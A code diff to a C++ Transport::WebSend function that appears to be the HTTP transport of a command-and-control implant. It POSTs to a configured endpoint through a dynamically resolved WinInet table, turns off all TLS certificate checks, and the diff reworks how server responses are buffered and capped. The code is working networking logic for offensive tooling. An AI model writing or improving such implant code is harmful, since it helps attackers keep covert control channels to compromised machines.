@@ -22,6 +22,7 @@ auto DECLFN Transport::WebSend(
     PVOID  TmpBuffer     = NULL;
     PVOID  RespBuffer    = NULL;
     SIZE_T RespSize      = 0;
+    SIZE_T RespCapacity  = 0;  
     DWORD  BytesRead     = 0;
     UINT32 ContentLength = 0;
     ULONG  ContentLenLen = sizeof(ContentLength);
@@ -29,12 +30,14 @@ auto DECLFN Transport::WebSend(
     ULONG HttpStatusCode = 0;
     ULONG HttpStatusSize = sizeof(HttpStatusCode);
 
+    if (RecvData) *RecvData = NULL;
+    if (RecvSize) *RecvSize = 0;
+
     HttpFlags = INTERNET_FLAG_RELOAD;
 
-    if (Self->Tsp->Web.ProxyEnabled)
-        HttpAccessType = INTERNET_OPEN_TYPE_PROXY;
+    if (Self->Tsp->Web.ProxyEnabled) HttpAccessType = INTERNET_OPEN_TYPE_PROXY;
 
-    hSession = Self->Wininet.InternetOpenW(
+    hSession = Self->Wininet.InternetOpenW(   
         Self->Tsp->Web.UserAgent, HttpAccessType,
         Self->Tsp->Web.ProxyUrl, 0, 0
     );
@@ -49,16 +52,16 @@ auto DECLFN Transport::WebSend(
 
     if (Self->Tsp->Web.Secure) {
         HttpFlags |= INTERNET_FLAG_SECURE;
-        OptFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+        OptFlags   = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_WRONG_USAGE |
                    SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
-    }
+    }        
 
-    hRequest = Self->Wininet.HttpOpenRequestW(
-        hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL,
-        NULL, NULL, HttpFlags, 0
+    hRequest = Self->Wininet.HttpOpenRequestW( 
+        hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL, 
+        NULL, NULL, HttpFlags, 0 
     );
     if (!hRequest) { KhDbg("last error: %d", KhGetError); goto _KH_END; }
 
@@ -78,74 +81,108 @@ auto DECLFN Transport::WebSend(
 
     KhDbg("http status code %d", HttpStatusCode);
 
-    Success = Self->Wininet.HttpQueryInfoW(
-        hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
-        &ContentLength, &ContentLenLen, NULL
-    );
+    if (HttpStatusCode >= 200 && HttpStatusCode < 300) {
+        Success = Self->Wininet.HttpQueryInfoW(
+            hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
+            &ContentLength, &ContentLenLen, NULL
+        );
 
-    if (!Success && KhGetError == 12150) {
-        KhDbg("content-length header not found");
-        Success = TRUE;
-    } else if ( ! Success ) {
-        KhDbg("last error: %d", KhGetError);
-        goto _KH_END;
-    }
+        if (Success) {
+            RespSize = ContentLength;
+            if (RespSize > 0) {
+                RespBuffer = PTR(Self->Hp->Alloc(RespSize + 1)); // +1 para null terminator
+                if (!RespBuffer) { 
+                    KhDbg("Failed to allocate response buffer");
+                    goto _KH_END;
+                }
 
-    RespSize = ContentLength;
-
-    if (RespSize) {
-        RespBuffer = PTR(Self->Hp->Alloc(RespSize + 1));
-        if (!RespBuffer) goto _KH_END;
-
-        Success = Self->Wininet.InternetReadFile(hRequest, RespBuffer, RespSize, &BytesRead);
-        if (!Success) goto _KH_END;
-    } else {
-        RespSize = 0;
-        RespBuffer = NULL;
-        TmpBuffer = PTR(Self->Hp->Alloc(BEG_BUFFER_LENGTH));
-        if (!TmpBuffer) goto _KH_END;
-
-        do {
-            Success = Self->Wininet.InternetReadFile(hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead);
-            if (!Success || BytesRead == 0) break;
-
-            RespSize += BytesRead;
-
-            if (!RespBuffer) {
-                RespBuffer = PTR(Self->Hp->Alloc(RespSize));
-                if (!RespBuffer) goto _KH_END;
+                Self->Wininet.InternetReadFile(hRequest, RespBuffer, RespSize, &BytesRead);
+                if (BytesRead != RespSize) {
+                    KhDbg("Read %d bytes, expected %zu", BytesRead, RespSize);
+                    Self->Hp->Free(RespBuffer);
+                    RespBuffer = NULL;
+                    goto _KH_END;
+                }
+            }
+        } else {
+            if (KhGetError == ERROR_HTTP_HEADER_NOT_FOUND) {
+                KhDbg("content-length header not found");
             } else {
-                RespBuffer = PTR(Self->Hp->ReAlloc(RespBuffer, RespSize));
-                if (!RespBuffer) goto _KH_END;
+                KhDbg("last error: %d", KhGetError);
             }
 
-            Mem::Copy(PTR(U_PTR(RespBuffer) + (RespSize - BytesRead)), TmpBuffer, BytesRead);
-            Mem::Zero(U_PTR(TmpBuffer), BytesRead);
-        } while (BytesRead > 0);
+            TmpBuffer = PTR(Self->Hp->Alloc(BEG_BUFFER_LENGTH));
+            if (!TmpBuffer) {
+                KhDbg("Failed to allocate temporary buffer");
+                goto _KH_END;
+            }
 
-        if (TmpBuffer) {
-            Self->Hp->Free(TmpBuffer);
-            TmpBuffer = NULL;
+            const SIZE_T MAX_RESPONSE_SIZE = 10 * 1024 * 1024; // 10MB limite
+            RespCapacity = BEG_BUFFER_LENGTH;
+            RespBuffer = PTR(Self->Hp->Alloc(RespCapacity));
+            if (!RespBuffer) {
+                KhDbg("Failed to allocate initial response buffer");
+                goto _KH_END;
+            }
+
+            do {
+                Success = Self->Wininet.InternetReadFile(hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead);
+                if (!Success || BytesRead == 0) break;
+
+                if ((RespSize + BytesRead) > RespCapacity) {
+                    SIZE_T newCapacity = max(RespCapacity * 2, RespSize + BytesRead);
+                    if (newCapacity > MAX_RESPONSE_SIZE) {
+                        KhDbg("Response too large");
+                        break;
+                    }
+
+                    PVOID newBuffer = PTR(Self->Hp->ReAlloc(RespBuffer, newCapacity));
+                    if (!newBuffer) {
+                        KhDbg("Failed to reallocate response buffer");
+                        break;
+                    }
+                    RespBuffer = newBuffer;
+                    RespCapacity = newCapacity;
+                }
+
+                Mem::Copy(PTR(U_PTR(RespBuffer) + RespSize), TmpBuffer, BytesRead);
+                RespSize += BytesRead;
+
+            } while (BytesRead > 0);
+
+            if (TmpBuffer) {
+                Self->Hp->Free(TmpBuffer);
+                TmpBuffer = NULL;
+            }
+
+            if (!Success) {
+                if (RespBuffer) {
+                    Self->Hp->Free(RespBuffer);
+                    RespBuffer = NULL;
+                    RespSize = 0;
+                }
+                goto _KH_END;
+            }
         }
+
+        if (RecvData) *RecvData = RespBuffer;
+        if (RecvSize) *RecvSize = RespSize;
+        Success = TRUE;
+    } else {
+        Success = FALSE;
     }
-
-    if (RespBuffer && RecvData) *RecvData = RespBuffer;
-    if (RecvSize) *RecvSize = RespSize;
-
-    Success = TRUE;
 
 _KH_END:
-    if (!Success && RespBuffer) {
-        Self->Hp->Free(RespBuffer);
-        RespBuffer = NULL;
-    }
-
-    if (TmpBuffer)
-        Self->Hp->Free(TmpBuffer);
-
+    if (TmpBuffer) Self->Hp->Free(TmpBuffer);
     if (hRequest) Self->Wininet.InternetCloseHandle(hRequest);
     if (hConnect) Self->Wininet.InternetCloseHandle(hConnect);
     if (hSession) Self->Wininet.InternetCloseHandle(hSession);
+
+    if (!Success && RespBuffer) {
+        Self->Hp->Free(RespBuffer);
+        if (RecvData) *RecvData = NULL;
+        if (RecvSize) *RecvSize = 0;
+    }
 
     return Success;
 }
